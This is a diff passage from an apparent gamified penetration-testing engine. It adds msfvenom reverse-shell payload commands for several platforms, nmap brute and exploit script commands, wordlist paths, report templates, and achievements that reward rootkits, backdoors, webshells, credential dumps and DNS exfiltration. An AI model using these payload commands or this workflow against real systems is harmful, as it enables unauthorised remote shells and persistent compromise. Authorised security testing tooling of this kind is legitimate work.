+                "linux_reverse_tcp": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf",
+                "windows_reverse_tcp": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe",
+                "php_reverse": "msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php",
+                "python_reverse": "msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.py",
+                "java_reverse": "msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war",
+                "android_reverse": "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f apk > shell.apk",
+            },
+        }, "internal"))
+        seed.append(("utility", "wordlist_paths", {
+            "name": "Common Wordlist Paths",
+            "paths": {
+                "rockyou": "/usr/share/wordlists/rockyou.txt",
+                "seclists": "/usr/share/seclists/",
+                "dirbuster_medium": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+                "common_web": "/usr/share/seclists/Discovery/Web-Content/common.txt",
+                "big_web": "/usr/share/seclists/Discovery/Web-Content/big.txt",
+                "directory_list": "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
+                "dns_names": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+                "usernames": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+            },
+        }, "internal"))
+        seed.append(("utility", "nmap_nse_scripts", {
+            "name": "Nmap NSE Script Categories",
+            "categories": {
+                "vuln": "nmap --script vuln -T4 target",
+                "auth": "nmap --script auth -p 21,22,23,80 target",
+                "discovery": "nmap --script discovery -p 80,443,8080 target",
+                "brute": "nmap --script brute -p 21,22,23,3306,5432 target",
+                "default": "nmap -sC target  # equivalent to --script default",
+                "safe": "nmap --script safe target",
+                "exploit": "nmap --script exploit target  # use with caution",
+                "intrusive": "nmap --script intrusive target  # may crash services",
+            },
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # REPORT TEMPLATES EXPANDED (3)
+        # ══════════════════════════════════════════════════════
+        seed.append(("report_template", "full_engagement_report", {
+            "name": "Full Penetration Test Report Template",
+            "sections": [
+                "1. Executive Summary (non-technical overview, risk rating)",
+                "2. Scope and Methodology (targets, tools, techniques)",
+                "3. Network Architecture (topology diagram, VLANs, segmentation)",
+                "4. Findings Summary (risk matrix: Critical/High/Medium/Low)",
+                "5. Detailed Findings (per finding: description, evidence, CVE, impact, remediation)",
+                "6. Attack Narratives (step-by-step chains showing compromise paths)",
+                "7. Recommendations (prioritized, with timelines)",
+                "8. Appendices (raw scans, tool output, hashes, screenshots)",
+            ],
+        }, "internal"))
+        seed.append(("report_template", "vulnerability_assessment_report", {
+            "name": "Vulnerability Assessment Report Template",
+            "sections": [
+                "1. Assessment Overview (scope, date, assessor)",
+                "2. Executive Dashboard (risk score, chart, key metrics)",
+                "3. Vulnerability Statistics (by severity, type, OS/service)",
+                "4. Critical Findings (detailed with CVE, CVSS, evidence)",
+                "5. High Findings",
+                "6. Medium Findings",
+                "7. Low Findings",
+                "8. Remediation Roadmap (immediate, 30-day, 90-day)",
+            ],
+        }, "internal"))
+        seed.append(("report_template", "wireless_security_report", {
+            "name": "Wireless Security Assessment Report",
+            "sections": [
+                "1. Wireless Environment Overview (SSIDs, standards, coverage)",
+                "2. Access Point Inventory (model, firmware, config)",
+                "3. Client Device Inventory (OS, connected AP, protocols)",
+                "4. Encryption Assessment (WEP/WPA/WPA2/WPA3 analysis)",
+                "5. Authentication Testing (PSK, Enterprise, RADIUS)",
+                "6. Attack Results (handshakes captured, cracks, evil twin success)",
+                "7. Rogue AP Detection",
+                "8. Recommendations (encryption, segmentation, monitoring)",
+            ],
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
         # STAGING / LOGGING ALL TO KNOWLEDGE
         # ══════════════════════════════════════════════════════
         for category, key, value, source in seed:
@@ -2176,6 +3428,76 @@ class TamagotchiEngine:
             try_achieve("night_owl")
         if 2 <= hour <= 5 and s.get("cycle_count", 0) >= 5:
             try_achieve("night_stalker")
+
+        # ── Extended milestones ──
+        if s["scans_run"] >= 100:
+            try_achieve("hundred_scans")
+        if s["vulns_found"] >= 20:
+            try_achieve("twenty_vulns")
+        if s.get("cycle_count", 0) >= 7:
+            try_achieve("week_streak")
+
+        # ── Check notification types for advanced achievements ──
+        notif_types = {n.type.value for n in self._notifications}
+        notif_titles = {n.title.lower() for n in self._notifications}
+        if any("ssrf" in t for t in notif_titles):
+            try_achieve("first_ssrf")
+        if any("xxe" in t for t in notif_titles):
+            try_achieve("first_xxe")
+        if any("deserialization" in t for t in notif_titles):
+            try_achieve("first_deserialization")
+        if any("jwt" in t for t in notif_titles):
+            try_achieve("first_jwt_bypass")
+        if any("graphql" in t for t in notif_titles):
+            try_achieve("first_graphql")
+        if any("sqli" in t or "sql injection" in t for t in notif_titles):
+            try_achieve("first_sqli")
+        if any("command injection" in t or "rce" in t for t in notif_titles):
+            try_achieve("first_command_injection")
+        if any("docker" in t and ("escape" in t or "breakout" in t) for t in notif_titles):
+            try_achieve("first_docker_escape")
+        if any("kubernetes" in t or "k8s" in t for t in notif_titles):
+            try_achieve("first_k8s_rce")
+        if any("aws" in t or "cloud" in t for t in notif_titles):
+            try_achieve("first_cloud_access")
+        if any("iot" in t or "camera" in t or "embedded" in t for t in notif_titles):
+            try_achieve("first_iot_hack")
+        if any("camera" in t and "access" in t for t in notif_titles):
+            try_achieve("first_camera_access")
+        if any("scada" in t or "plc" in t or "ics" in t for t in notif_titles):
+            try_achieve("first_scada_exploit")
+        if any("router" in t and "backdoor" in t for t in notif_titles):
+            try_achieve("first_router_backdoor")
+        if any("firmware" in t for t in notif_titles):
+            try_achieve("firmware_extracted")
+        if any("vlan" in t for t in notif_titles):
+            try_achieve("first_vlan_hop")
+        if any("dns" in t and ("poison" in t or "spoof" in t) for t in notif_titles):
+            try_achieve("first_dns_poison")
+        if any("dhcp" in t and "rogue" in t for t in notif_titles):
+            try_achieve("first_rogue_dhcp")
+        if any("pam" in t and "backdoor" in t for t in notif_titles):
+            try_achieve("pam_backdoor_installed")
+        if any("rootkit" in t for t in notif_titles):
+            try_achieve("rootkit_installed")
+        if any("golden ticket" in t for t in notif_titles):
+            try_achieve("golden_ticket_created")
+        if any("webshell" in t for t in notif_titles):
+            try_achieve("webshell_deployed")
+        if any("token" in t and ("impersonat" in t or "steal" in t) for t in notif_titles):
+            try_achieve("first_token_impersonation")
+        if any("credential" in t and "dump" in t for t in notif_titles):
+            try_achieve("first_credential_dump")
+        if any("dns" in t and "exfil" in t for t in notif_titles):
+            try_achieve("first_dns_exfil")
+        if any("tunnel" in t for t in notif_titles):
+            try_achieve("first_tunnel")
+
+        # ── Combo achievements ──
+        if s["access_gained"] >= 1 and s["privilege_escalations"] >= 1 and s["backdoors_installed"] >= 1:
+            try_achieve("recon_to_root")
+        if s["access_gained"] >= 5:
+            try_achieve("five_os_types")
 
         for ach in new_achievements:
             self.award_xp("achievement_unlocked", ach["xp"], ach["name"])
@@ -4473,20 +5795,6 @@ class TamagotchiEngine:
 
     def get_scan_history(self) -> List[Dict[str, Any]]:
         return self._scan_history
-
-    def get_status(self) -> Dict[str, Any]:
-        return {
-            "running": self._running,
-            "paused": self._paused,
-            "state": self._state.value,
-            "devices": len(self._devices),
-            "networks": len(self._networks),
-            "wifi_aps": len(self._wifi_aps),
-            "topology_nodes": len(self._topology.get("nodes", [])),
-            "topology_edges": len(self._topology.get("edges", [])),
-            "last_scan": self._last_full_scan,
-            "our_ip": self._our_ip,
-        }
 
     def get_live_events(self, since: float = 0) -> List[Dict[str, Any]]:
         if since == 0:
